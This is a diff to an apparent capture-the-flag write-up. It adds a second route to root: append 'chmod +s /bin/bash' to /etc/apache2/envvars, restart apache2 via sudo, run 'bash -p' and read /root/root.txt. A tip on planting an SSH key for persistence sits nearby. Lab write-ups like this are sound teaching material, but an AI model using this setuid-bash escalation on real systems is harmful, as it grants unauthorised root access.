@@ -203,7 +203,7 @@ Another shell, another user (and another flag)
 
 _Note: be kind with yourself and put your public key in /home/anders/.ssh/authorized_keys_ 
 
-## Flag 7: Privesc with lxd
+## Flag 7: Privesc with lxd -- Note : see a far less tricky version below
 
 Root privilege escalation... This one is tricky.
 * First, sudo tells us that we can restart apache2
@@ -246,3 +246,17 @@ cat root.txt
 __REDACTED__
 ```
 Voilà !
+
+## Flag 7 again : Privesc with chmod
+Let's edit the same /etc/apache2/envvars, and just add inside
+```
+chmod +s /bin/bash
+```
+Now, restart apache2 (using sudo): bash now has the suid flag !!!
+```
+$ bash -p
+# bash-5.0# id
+uid=1000(anders) gid=1000(anders) euid=0(root) egid=0(root) groups=0(root),24(cdrom),27(sudo),30(dip),46(plugdev),1000(anders)
+bash-5.0# cat /root/root.txt
+__REDACTED__
+```
